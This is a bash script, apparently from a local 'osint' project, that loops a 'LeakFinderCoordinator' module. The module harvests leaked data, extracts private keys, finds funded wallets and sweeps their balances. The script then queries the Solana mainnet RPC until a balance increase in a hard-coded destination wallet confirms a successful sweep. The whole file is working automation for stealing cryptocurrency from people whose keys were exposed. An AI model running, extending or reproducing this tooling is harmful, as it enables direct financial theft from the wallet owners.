#!/bin/bash
# Sweep Success Evaluator
# Runs coordinator scan cycles until a sweep lands on-chain.
# Returns exit 0 on success, exit 1 on timeout/no-sweep.

set -e
cd /Users/paijo/1ai-osint

DEST_WALLET="4FRKaVCCHzewoi8wekgXYGDh8Tq6GLJegwE18SDcePzZ"
SOLANA_RPC="https://api.mainnet-beta.solana.com"
MAX_ITERATIONS=${1:-12}  # Default 12 iterations (~2 hours at 10min each)
LOG_FILE="/tmp/sweep-evaluator.log"

echo "=== Sweep Success Evaluator ===" | tee "$LOG_FILE"
echo "Destination: $DEST_WALLET" | tee -a "$LOG_FILE"
echo "Max iterations: $MAX_ITERATIONS" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

# Get initial balance
get_balance() {
    curl -s "$SOLANA_RPC" -X POST -H "Content-Type: application/json" \
        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getBalance\",\"params\":[\"$DEST_WALLET\"]}" \
        | python -c "import sys,json; print(json.load(sys.stdin).get('result',{}).get('value',0))"
}

# Check for new incoming TXs
get_recent_txs() {
    curl -s "$SOLANA_RPC" -X POST -H "Content-Type: application/json" \
        -d "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"getSignaturesForAddress\",\"params\":[\"$DEST_WALLET\",{\"limit\":5}]}" \
        | python -c "
import sys,json
data = json.load(sys.stdin)
for tx in data.get('result',[]):
    if tx.get('err') is None:
        print(tx['signature'])
" 2>/dev/null
}

INITIAL_BALANCE=$(get_balance)
echo "Initial balance: $INITIAL_BALANCE lamports" | tee -a "$LOG_FILE"
INITIAL_TXS=$(get_recent_txs | head -1)
echo "Initial latest TX: $INITIAL_TXS" | tee -a "$LOG_FILE"
echo "" | tee -a "$LOG_FILE"

for i in $(seq 1 $MAX_ITERATIONS); do
    echo "--- Iteration $i/$MAX_ITERATIONS ---" | tee -a "$LOG_FILE"
    echo "$(date): Starting scan cycle..." | tee -a "$LOG_FILE"

    # Run coordinator
    export $(grep -v '^#' .env | xargs 2>/dev/null)
    RESULT=$(PYTHONPATH=. python -c "
import asyncio, logging
logging.basicConfig(level=logging.WARNING)
from src.modules.crypto.leak_finder.coordinator import LeakFinderCoordinator

async def run():
    c = LeakFinderCoordinator()
    r = await c.run_once()
    print(f'leaks={r.raw_leaks_fetched} keys={r.keys_extracted} checked={r.addresses_checked} funded={r.funded_wallets} sweeps={len(r.sweep_results)}')
    for sr in r.sweep_results:
        if sr.success:
            print(f'SUCCESS: {sr.chain} {sr.source_address[:20]} amount={sr.amount} tx={sr.tx_hash}')
asyncio.run(run())
" 2>&1)

    echo "$RESULT" | tee -a "$LOG_FILE"

    # Check if any sweep reported success
    if echo "$RESULT" | grep -q "SUCCESS:"; then
        echo "Sweep reported success! Verifying on-chain..." | tee -a "$LOG_FILE"

        # Wait for confirmation
        sleep 10

        # Check balance change
        NEW_BALANCE=$(get_balance)
        BALANCE_DIFF=$((NEW_BALANCE - INITIAL_BALANCE))
        echo "New balance: $NEW_BALANCE lamports (diff: $BALANCE_DIFF)" | tee -a "$LOG_FILE"

        if [ "$BALANCE_DIFF" -gt 0 ]; then
            echo "" | tee -a "$LOG_FILE"
            echo "=== SUCCESS! ===" | tee -a "$LOG_FILE"
            echo "Balance increased by $BALANCE_DIFF lamports" | tee -a "$LOG_FILE"
            echo "New TXs:" | tee -a "$LOG_FILE"
            get_recent_txs | tee -a "$LOG_FILE"
            exit 0
        fi

        # Also check for new TXs
        NEW_TXS=$(get_recent_txs)
        if [ "$NEW_TXS" != "$INITIAL_TXS" ]; then
            echo "" | tee -a "$LOG_FILE"
            echo "=== SUCCESS (new TX detected)! ===" | tee -a "$LOG_FILE"
            echo "New TXs:" | tee -a "$LOG_FILE"
            echo "$NEW_TXS" | tee -a "$LOG_FILE"
            exit 0
        fi

        echo "No on-chain change detected yet (may be pending)" | tee -a "$LOG_FILE"
    fi

    echo "$(date): Cycle $i complete" | tee -a "$LOG_FILE"
    echo "" | tee -a "$LOG_FILE"

    # Small delay between cycles
    sleep 30
done

echo "" | tee -a "$LOG_FILE"
echo "=== TIMEOUT: No sweep landed after $MAX_ITERATIONS iterations ===" | tee -a "$LOG_FILE"
echo "Check $LOG_FILE for details" | tee -a "$LOG_FILE"
exit 1
